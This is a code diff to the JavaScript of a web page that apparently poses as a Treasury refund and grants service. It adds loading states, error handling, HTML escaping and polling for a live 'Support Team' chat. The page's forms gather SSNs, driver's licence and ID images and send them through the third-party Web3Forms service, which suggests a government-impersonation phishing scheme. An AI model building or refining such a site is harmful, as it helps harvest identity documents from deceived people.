@@ -1131,9 +1131,29 @@
             document.getElementById('idBackFileName').textContent = fileName ? 'Back image: ' + fileName : '';
         });
         
+        function setFormSubmitting(form, isSubmitting) {
+            const button = form.querySelector('button[type="submit"]');
+            if (!button) return;
+            if (isSubmitting) {
+                button.dataset.originalContent = button.innerHTML;
+                button.disabled = true;
+                button.setAttribute('aria-busy', 'true');
+                button.classList.add('opacity-75', 'cursor-wait');
+                button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2" aria-hidden="true"></i>Processing...';
+                return;
+            }
+            button.disabled = false;
+            button.removeAttribute('aria-busy');
+            button.classList.remove('opacity-75', 'cursor-wait');
+            button.innerHTML = button.dataset.originalContent || button.innerHTML;
+            delete button.dataset.originalContent;
+        }
+
         // Form Submissions with Success Messages
         document.getElementById('refundForm')?.addEventListener('submit', async function(e) {
             e.preventDefault();
+            setFormSubmitting(this, true);
+            try {
             const data = await collectFormData(this);
             
             // Send to Web3Forms
@@ -1149,10 +1169,18 @@
             this.reset();
             document.getElementById('dlFileName').textContent = '';
             showSuccessModal('✔ Successfully Submitted!', 'Your refund status inquiry has been submitted successfully. You will receive a confirmation email shortly. Your application ID is: ' + savedApp.id);
+            } catch (error) {
+                console.error('Refund submission failed', error);
+                alert('Unable to submit your refund status inquiry. Please try again.');
+            } finally {
+                setFormSubmitting(this, false);
+            }
         });
         
         document.getElementById('grantsForm')?.addEventListener('submit', async function(e) {
             e.preventDefault();
+            setFormSubmitting(this, true);
+            try {
             const data = await collectFormData(this);
             
             // Send to Web3Forms
@@ -1166,10 +1194,18 @@
             closeModal('grantsModal');
             this.reset();
             showSuccessModal('✔ Successfully Submitted!', 'Your grant inquiry has been submitted successfully. A representative will contact you within 3-5 business days. Your application ID is: ' + savedApp.id);
+            } catch (error) {
+                console.error('Grant inquiry submission failed', error);
+                alert('Unable to submit your grant inquiry. Please try again.');
+            } finally {
+                setFormSubmitting(this, false);
+            }
         });
         
         document.getElementById('applyForm')?.addEventListener('submit', async function(e) {
             e.preventDefault();
+            setFormSubmitting(this, true);
+            try {
             const data = await collectFormData(this);
             
             // Send to Web3Forms
@@ -1192,6 +1228,12 @@
             document.getElementById('idFrontFileName').textContent = '';
             document.getElementById('idBackFileName').textContent = '';
             showSuccessModal('✔ Successfully Submitted!', 'Your official application has been submitted successfully. Your application ID is: ' + appId + '. Please save this for your records. You will receive a confirmation email shortly.');
+            } catch (error) {
+                console.error('Official application submission failed', error);
+                alert('Unable to submit your official application. Please try again.');
+            } finally {
+                setFormSubmitting(this, false);
+            }
         });
         
         document.getElementById('contactForm')?.addEventListener('submit', async function(e) {
@@ -1211,7 +1253,35 @@
         });
         
         // Chat Bot
-        function toggleChat() { document.getElementById('chatContainer').classList.toggle('active'); }
+        async function loadVisitorChat() {
+            const visitor = getCurrentVisitor();
+            const token = getVisitorAuthToken();
+            if (!visitor?.id || !token || !VISITOR_APP_CONFIG.API_BASE_URL) return;
+            try {
+                const response = await fetch(`${API_BASE}/chats/${encodeURIComponent(visitor.id)}`, {
+                    headers: { Authorization: `Bearer ${token}` }
+                });
+                if (!response.ok) throw new Error(`Chat API returned ${response.status}`);
+                const chat = await response.json();
+                const container = document.getElementById('chatMessages');
+                container.innerHTML = '';
+                (chat.messages || []).forEach((message) => {
+                    addChatMessage(message.text, message.from === 'visitor' ? 'user' : 'bot', message.from === 'admin');
+                });
+                await fetch(`${API_BASE}/chats/${encodeURIComponent(visitor.id)}/markRead`, {
+                    method: 'POST',
+                    headers: { Authorization: `Bearer ${token}` }
+                });
+            } catch (error) {
+                console.warn('Chat load failed', error.message);
+            }
+        }
+
+        function toggleChat() {
+            const chatContainer = document.getElementById('chatContainer');
+            chatContainer.classList.toggle('active');
+            if (chatContainer.classList.contains('active')) loadVisitorChat();
+        }
         function handleChatKeypress(e) { if (e.key === 'Enter') sendChatMessage(); }
         function quickChat(message) { document.getElementById('chatInput').value = message; sendChatMessage(); }
         function sendChatMessage() {
@@ -1230,18 +1300,29 @@
                     method: 'POST',
                     headers,
                     body: JSON.stringify({ from: 'visitor', text: message, visitorName: visitor.name })
-                }).catch(err => console.warn('Chat post failed', err.message));
+                })
+                    .then((response) => {
+                        if (!response.ok) throw new Error(`Chat API returned ${response.status}`);
+                        return loadVisitorChat();
+                    })
+                    .catch((error) => console.warn('Chat post failed', error.message));
             } else {
                 // fallback: simulate bot reply
                 setTimeout(() => { addChatMessage(generateBotResponse(message), 'bot'); }, 500);
             }
         }
-        function addChatMessage(text, sender) {
+        function addChatMessage(text, sender, isAdminMessage = false) {
             const container = document.getElementById('chatMessages');
             const messageDiv = document.createElement('div');
+            const safeText = escapeHtml(text);
             messageDiv.className = `message ${sender} animate-fade-in`;
-            if (sender === 'bot') messageDiv.innerHTML = `<p class="font-medium mb-1"><i class="fas fa-robot mr-2"></i>Treasury Assistant</p><p>${text}</p>`;
-            else messageDiv.innerHTML = `<p>${text}</p>`;
+            if (sender === 'bot') {
+                const senderName = isAdminMessage ? 'Support Team' : 'Treasury Assistant';
+                const senderIcon = isAdminMessage ? 'fa-user-shield' : 'fa-robot';
+                messageDiv.innerHTML = `<p class="font-medium mb-1"><i class="fas ${senderIcon} mr-2"></i>${senderName}</p><p>${safeText}</p>`;
+            } else {
+                messageDiv.innerHTML = `<p>${safeText}</p>`;
+            }
             container.appendChild(messageDiv);
             container.scrollTop = container.scrollHeight;
         }
@@ -1499,6 +1580,9 @@
             await restoreVisitorSession();
             ensureVisitorSession();
             updateAdminBadge();
+            window.setInterval(() => {
+                if (document.getElementById('chatContainer')?.classList.contains('active')) loadVisitorChat();
+            }, 12000);
         });        // SSN Formatting
         document.querySelectorAll('input[name="ssn"]').forEach(input => {
             input.addEventListener('input', function(e) {
